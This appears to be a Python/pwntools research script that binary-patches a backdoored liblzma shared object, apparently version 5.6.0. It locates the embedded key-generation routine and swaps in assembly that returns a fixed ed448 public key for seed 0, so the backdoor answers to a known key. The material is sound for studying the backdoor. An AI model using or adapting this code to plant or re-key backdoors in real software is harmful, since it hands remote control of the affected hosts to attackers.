#!/usr/bin/env python3
import os, sys
path = sys.argv[1]
if not os.path.exists(path):
  print("usage: patch.py <path>")
  sys.exit(1)

from pwn import *
context.update(arch='amd64', os='linux')

# generate_key bytes from backdoored v5.6.0
func = unhex('f30f1efa4885ff0f848e000000415455'
             '534889f34881eca00000004885f67504'
             '31c0eb6b4c8b4e084d85c974f34889e2'
             '31c0488d6c24304989fcb90c00000048'
             '89d74989e8be30000000f3abb91c0000'
             '004889eff3ab488d4c24204889d7')
flen = 160

# replace generate_key with a static key from mem
p = asm('''
  push rsi
  lea rsi,[rip+72]
  mov rax, [rsi+0x00]
  mov [rdi+0x00], rax
  mov rax, [rsi+0x08]
  mov [rdi+0x08], rax
  mov rax, [rsi+0x10]
  mov [rdi+0x10], rax
  mov rax, [rsi+0x18]
  mov [rdi+0x18], rax
  mov rax, [rsi+0x20]
  mov [rdi+0x20], rax
  mov rax, [rsi+0x28]
  mov [rdi+0x28], rax
  mov rax, [rsi+0x30]
  mov [rdi+0x30], rax
  mov rax, [rsi+0x38]
  mov [rdi+0x38], rax
  mov eax, 1
  pop rsi
  ret
  nop
  nop
  nop
''')

# ed448 public key for seed 0
p += unhex('5b3afe03878a49b28232d4f1a442aebd'
           'e109f807acef7dfd9a7f65b962fe52d6'
           '547312cacecff04337508f9d2529a8f1'
           '669169b21c32c48000')
p += b'\x00' * (flen - len(p))

# patch .so
with open(path, 'rb') as f:
  lzma = f.read()
if func not in lzma:
  print('Could not identify func')
  sys.exit(1)
off = lzma.index(func)
print('Patching func at offset: ' + hex(off))
with open(path+'.patch', 'wb') as f:
  f.write(lzma[:off]+p+lzma[off+flen:])
print('Generated patched so: ' + path+'.patch')
